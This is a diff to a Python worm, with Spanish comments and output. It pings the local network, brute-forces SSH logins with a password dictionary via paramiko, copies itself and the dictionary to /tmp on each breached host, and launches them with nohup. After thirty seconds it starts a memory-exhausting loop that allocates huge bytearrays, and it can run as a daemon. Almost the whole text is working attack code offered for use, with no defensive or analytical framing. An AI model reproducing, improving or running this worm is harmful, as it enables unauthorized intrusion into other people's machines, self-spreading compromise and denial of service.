@@ -12,6 +12,8 @@ import logging
 import sys
 import time
 import random
+import time
+import nmap
 from lib.daemon import Daemon
 from threading import Timer
 from queue import Queue
@@ -19,26 +21,47 @@ from queue import Queue
 
 #* ----------------------------- Daemon--------------------------------
 class YourCode(object):
+    
     def run(self):
+        tr1 = False
+        tr2 = False
         while True:
-            print('corriendo')
-            t = Timer(30.0, set_interval(process_queue,2))
-            t.start()
-            iniciar()
+            print('test')
+            time.sleep(1)
+            if (tr1 == False):
+                t1 = threading.Thread(target= iniciar())
+                tr1 = True
+                t1.start()
+                t1.join()
+            if (tr2 == False):    
+                t2 = threading.Thread(target= treintasec())          
+                t2.start()
+                t2.join()
+                tr2 = True
+
+        #t1 = threading.Thread(target= iniciar())
+       # t2 = threading.Thread(target= treintasec())
+        #t1.start()
+        #t1.join()
+        #t2.start()
+        #t2.join()
+        
+     
+           
              # after 30 seconds, "hello, world" will be printed
-          
-
-
 
 class MyDaemon(Daemon):
     def run(self):
         # Or simply merge your code with MyDaemon.
+        print('Mi codigo')
+        logging.info('Mi codigo')
         your_code = YourCode()
         your_code.run()
         
 #* ----------------------------- Consumir recursos--------------------------------
 def process_queue():
     print ('Consumiendo Recursos..')
+    logging.info('Consumiendo Recursos..')
     while True:
             for i in range(0,51200000):
                 bytearray(51200000) # array de bits
@@ -113,12 +136,14 @@ def map_network(pool_size=255):
 
     # prepare the jobs queue
     jobs = multiprocessing.Queue()
+
     results = multiprocessing.Queue()
 
     pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
 
     for p in pool:
         p.start()
+
 
     # cue hte ping processes
     for i in range(1, 255):
@@ -140,14 +165,25 @@ def map_network(pool_size=255):
 
 #!-------------------------------------------------
 
-def UploadFileAndExecute(sshConnection, fileName) :
+def UploadFileAndExecute(sshConnection, route,passw) :
+        try:
+            print("[+] Copiando Archivo ")
+            logging.info("[+] Copiando Archivo ")
+            logging.info(route)
+            sftpClient = sshConnection.open_sftp()
+            sftpClient.put(route + '/scan', "/tmp/scan")
+            sftpClient.put(route + '/dictionary', "/tmp/dictionary")
+            sshConnection.exec_command("chmod a+x /tmp/scan")
+            sshConnection.exec_command("chmod a+x /tmp/dictionary")
+            print("[+] Ejecutando Archivo ")
+            sshConnection.exec_command("nohup /tmp/scan start /tmp &> /tmp/nohup.out")
+            sshConnection.close()
+            print("[+] Archivo ejecutado: nohup /tmp/scan start /tmp" )
+        except Exception as e:
+                print(e.args)
+                logging.error(e.args)
 
-        print("[+] Copiando Archivo ")
-        sftpClient = sshConnection.open_sftp()
-        sftpClient.put(fileName, "/tmp/" +fileName)
-        sshConnection.exec_command("chmod a+x /tmp/" +fileName)
-        print("[+] Ejecutando Archivo ")
-        sshConnection.exec_command("nohup /tmp/" +fileName+ " service_start")
+
 	#sshConnection.exec_command("nohup /tetmp/" +fileName+ " &")
    
 def generate_the_word(infile):
@@ -158,35 +194,37 @@ def generate_the_word(infile):
 def AttackSSH(ipAddress, dictionaryFile) :
 
                 print("[H] Atacando Host : %s " %ipAddress)
-
+                logging.info("[H] Atacando Host : %s " %ipAddress)
                
-
                 ssh = paramiko.SSHClient()
-            
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
-    
-    
+                infile = dictionaryFile
                 while True:
-                    
+                 
                     try :
-                        infile = dictionaryFile
-                        print(generate_the_word(infile))
+                        logging.info("Trycatch")
+                        
                         [username, password] = generate_the_word(infile).strip().split()
+                        logging.info("Usuario y clave")
                         print("[?] Intentando entrar con usuario: %s y  clave: %s [HOST: %s]" % (username, password,ipAddress))
+                        logging.info("[?] Intentando entrar con usuario: %s y  clave: %s [HOST: %s]" % (username, password,ipAddress))
                         ssh.connect(ipAddress, username=username, password=password)
                     except paramiko.AuthenticationException:
                         print("[-] Auenticacion fallida: %s")
+                        logging.error('"[-] Auenticacion fallida: %s"')
                     except paramiko.SSHException as sshException:
                         print("[-] No se puede establecer una conexion ssh: %s" % sshException)
+                        logging.error("[-] No se puede establecer una conexion ssh: %s" % sshException)
                     except paramiko.ssh_exception.NoValidConnectionsError as sshException:
                         print("[-] No se puede conectar al puerto: %s" % sshException)
+                        logging.error("[-] No se puede conectar al puerto: %s" % sshException)
                         break;
                     except Exception as e:
                         print(e.args)
                     else:
                         print("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
-                        UploadFileAndExecute(ssh, 'main')
+                        logging.info("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
+                        UploadFileAndExecute(ssh, sys.argv[2], password)
                         break;
 
                     #UploadFileAndExecute(ssh, 'main')		
@@ -195,25 +233,51 @@ def AttackSSH(ipAddress, dictionaryFile) :
 
 
 def iniciar():
+    try:
         print('Mapeando...')
+        logging.info('Mapeando...')
         lst = map_network()
+        logging.info('Listo...')
         for item in lst:
             print(item)		
-            t1 = threading.Thread(target= AttackSSH(item,'dictionary'))
-            t1.start()
-            t1.join()
-    
+            logging.info("Item: %s " %item)
+            AttackSSH(item,sys.argv[2]  + '/dictionary')
+    except Exception as e:
+                        print(e.args)
+                        logging.error(e.args)
+
+
+def treintasec():
+        print('Iniciando consumo de recursos despues de 30 segundos')
+        logging.info('Iniciando consumo de recursos despues de 30 segundos')
+        time.sleep(30)  # Sleep 5 seconds
+        logging.info('Proceso iniciado')
+        set_interval(process_queue,2)
+  
+        
+def start():
+        t1 = threading.Thread(target= iniciar())
+        t1.start()
+        t1.join()
+        t2 = threading.Thread(target= treintasec())          
+        t2.start()
+        t2.join()
+
 if __name__ == "__main__" :
      logging.basicConfig(filename='worn.log', level=logging.INFO)
-     logging.info('Inicio')
-     logging.info('Doing something')
-     
+     logging.info('Ejecutando comando: ' + sys.argv[1])
 	 #AttackSSH(sys.argv[1], sys.argv[2])
-     daemon = MyDaemon('/tmp/daemon-example.pid')
-if len(sys.argv) == 2:
-    if 'start' == sys.argv[1]:
+     daemon = MyDaemon('/tmp/worm.pid')
+if len(sys.argv) >= 2:
+    if '30sec' == sys.argv[1]:
+        print('Iniciando consumo de recursos despues de 30 segundos')
         iniciar()
+        time.sleep(10)  # Sleep 5 seconds
+        treintasec()
+    if 'start' == sys.argv[1]:
+        start()
     if 'service_start' == sys.argv[1]:
+        print('Iniciando daemon')
         daemon.start()
     elif 'service_stop' == sys.argv[1]:
         daemon.stop()
@@ -231,7 +295,7 @@ if len(sys.argv) == 2:
     sys.exit(0)
     logging.info('Finalizo')
 else:
-    print ("Como usar: %s start|service_start|service_stop|service_restart" % sys.argv[0])
+    print ("Como usar: %s start|service_start|service_stop|service_restart y un segundo argumento que es la ruta" % sys.argv[0])
     sys.exit(2)
     logging.info('Finalizo')
  
